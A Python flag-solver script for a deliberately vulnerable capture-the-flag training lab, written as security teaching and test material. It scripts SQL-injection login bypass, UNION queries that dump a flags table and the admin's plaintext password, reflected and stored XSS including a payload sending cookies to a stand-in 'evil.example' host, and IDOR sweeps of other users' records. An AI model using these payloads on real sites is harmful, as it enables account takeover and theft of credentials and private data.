# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright (c) 2026 CommonHuman-Lab
"""Flag solver for the Rewind Range lab (id=1). Plain requests only —
OctoRig is a target for the commonhuman-* toolkit, not a consumer of it.
"""
from __future__ import annotations

import re

import requests

FLAG_RE = re.compile(r"FLAG\{[^}]*\}")

# genre LIKE '%<injected>%' — closing the LIKE string then UNION-selecting
# from the hidden _flags table, padded to the products table's 11 columns
# (id, type, title, creator, genre, year, price, stock, description,
# condition, platform). `value` lands in `title` so it renders directly.
_BROWSE_FLAGS_UNION = (
    "zzznotfound' UNION SELECT id,'vhs',value,name,'Flags',2026,9.99,1,"
    "'Good','Good',NULL FROM _flags WHERE name='{name}' -- "
)

_BROWSE_CREDS_UNION = (
    "zzznotfound' UNION SELECT id,'vhs',password,username,'Flags',2026,9.99,1,"
    "'Good','Good',NULL FROM users WHERE username='admin' -- "
)

_TITLE_RE = re.compile(r'<h3><a[^>]*>([^<]+)</a></h3>')


def _extract(text: str) -> str | None:
    m = FLAG_RE.search(text)
    return m.group(0) if m else None


def solve(base_url: str) -> dict[str, str]:
    found: dict[str, str] = {}
    s = requests.Session()

    s.get(f"{base_url}/robots.txt", timeout=10)

    # rw-sqli-login-bypass: classic admin'-- tautology bypass, no password needed.
    s.post(f"{base_url}/login", data={"username": "admin'--", "password": "x"}, timeout=10)
    r = s.get(f"{base_url}/admin", timeout=10)
    flag = _extract(r.text)
    if flag:
        found["rw-sqli-login-bypass"] = flag

    # rw-recon-robots: /manager-office requires the admin session we now have.
    r = s.get(f"{base_url}/manager-office", timeout=10)
    flag = _extract(r.text)
    if flag:
        found["rw-recon-robots"] = flag

    # rw-sqli-browse-union / rw-py-sqli-script: same UNION vector, two _flags rows.
    for slug, name in (
        ("rw-sqli-browse-union", "sqli-union"),
        ("rw-py-sqli-script", "python-sqli"),
    ):
        r = s.get(f"{base_url}/browse", params={"genre": _BROWSE_FLAGS_UNION.format(name=name)}, timeout=10)
        flag = _extract(r.text)
        if flag:
            found[slug] = flag

    # rw-sqli-cred-dump: extract admin's plaintext password via the same injection point.
    r = s.get(f"{base_url}/browse", params={"genre": _BROWSE_CREDS_UNION}, timeout=10)
    m = _TITLE_RE.search(r.text)
    if m:
        found["rw-sqli-cred-dump"] = f"FLAG{{{m.group(1)}}}"

    # rw-xss-reflected-search: non-HttpOnly cookie set on /search.
    s.get(f"{base_url}/search", params={"q": "<script>alert(document.cookie)</script>"}, timeout=10)
    cookie = s.cookies.get("xss_challenge")
    if cookie:
        found["rw-xss-reflected-search"] = cookie

    # rw-xss-stored-feedback / rw-session-forge: both flags render on the admin
    # feedback page once an admin reads a submitted (unsanitised) message.
    s.post(
        f"{base_url}/feedback",
        data={
            "name": "pwn3r",
            "email": "pwn3r@example.com",
            "message": "<script>fetch('//evil.example/steal?c='+document.cookie)</script>",
        },
        timeout=10,
    )
    r = s.get(f"{base_url}/admin/feedback", timeout=10)
    for m in FLAG_RE.finditer(r.text):
        val = m.group(0)
        if "stored_xss" in val:
            found["rw-xss-stored-feedback"] = val
        if "session_forged" in val:
            found["rw-session-forge"] = val

    # rw-idor-inbox: log in as a regular user, read someone else's message by id.
    user_s = requests.Session()
    user_s.post(f"{base_url}/login", data={"username": "alice", "password": "iloveyou"}, timeout=10)
    r = user_s.get(f"{base_url}/inbox/1", timeout=10)
    flag = _extract(r.text)
    if flag:
        found["rw-idor-inbox"] = flag

    # rw-idor-rental-api: sweep /api/v1/rentals/<id> as the same regular user.
    for rental_id in range(1, 18):
        r = user_s.get(f"{base_url}/api/v1/rentals/{rental_id}", timeout=10)
        flag = _extract(r.text)
        if flag:
            found["rw-idor-rental-api"] = flag
            break

    return found
